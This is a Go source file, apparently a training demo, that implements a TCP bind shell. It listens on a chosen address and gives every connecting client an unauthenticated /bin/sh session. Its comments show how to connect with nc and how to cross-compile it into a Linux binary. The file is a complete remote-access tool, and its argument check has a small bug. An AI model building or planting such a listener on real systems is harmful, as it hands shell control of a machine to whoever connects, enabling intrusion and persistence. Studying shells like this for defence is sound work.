package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

/*
P71 TCP server demo, bind shell basic
The demo function: receive client data
use telnet or nc to connect bind shell

usage:
go run tcp_bind_shell_v2.go 0.0.0.0:9999
./tcp_bind_shell_v2 0.0.0.0:9999

nc 192.168.X.X 9999

go cross compiling
ref: https://www.jianshu.com/p/3ff21f818182

windows cross compile linux elf, default is windows exe
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build tcp_bind_shell_v2.go
*/

func main() {
	var addr string
	if len(os.Args) != 2 {
		fmt.Println("Usage: " + os.Args[0] + " <bindAddress>")
		fmt.Println("Example: " + os.Args[1] + " 0.0.0.0:9999")
		os.Exit(1)
	}
	addr = os.Args[1]

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalln("Error connection!", err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("accepting connection err: ", err)
		}
		go handleConnection(conn)
	}

}

func handleConnection(conn net.Conn) {
	// use this shell means bind_shell only run in linux/unix
	var shell = "/bin/sh"
	_,_ = conn.Write([]byte("[+] bind shell demo \n"))
	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	_ = command.Run()
}
